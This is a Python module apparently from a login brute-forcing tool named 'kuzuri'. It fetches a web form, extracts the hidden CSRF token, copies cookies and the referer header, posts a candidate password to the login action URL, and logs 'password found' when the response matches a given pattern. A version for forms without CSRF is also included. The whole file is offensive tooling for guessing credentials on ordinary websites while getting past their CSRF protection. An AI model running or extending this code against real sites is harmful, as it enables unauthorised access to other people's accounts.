#!usr/bin/python

import requests
import re
import logging

logging.basicConfig(format='[kuzuri]: %(message)s', level=logging.INFO)


def _check(r, pwd, pattern):
    if re.search(pattern, r.text):
        logging.info('this url: %s', r.url)
        logging.info('')
        exit(logging.info("OK, password found %s", pwd))

    else:
        logging.info('this url: %s', r.url)


def _CsrfToken(html, csrf):
    html = re.sub('>\s+<', '><', html)
    html = html.replace('><', '>\n<')
    input_field = re.search(
        r'(<input(?:.*?)name=["\']{0}["\'](?:.*)>)\n'.format(csrf), html).group()
    csrf_token = re.findall(
        r'value=(?P<quote>["\'])(.*?)(?P=quote)', input_field)[0][1]

    return csrf_token


def with_csrf(url=None, action_url=None, data=None, pwd=None, csrf_name=None, headers=None, pattern=None):
    s = requests.Session()
    if headers:
        s.headers = headers

    html = s.get(url)
    csrf_token = _CsrfToken(html.text, csrf_name)
    logging.info("hidden(%s): %s", csrf_name, csrf_token)

    s.headers["referer"] = html.url
    s.headers["Cookie"] = ';'.join(
        map(lambda x: '='.join(x), list(dict(html.cookies).items())))
    data[csrf_name] = csrf_token

    r = s.post(action_url, data)
    _check(r, pwd, pattern)


def without_csrf(action_url=None, data=None, pwd=None, headers=None, pattern=None):
    r = requests.post(action_url, data=data, headers=headers)
    _check(r, pwd, pattern)
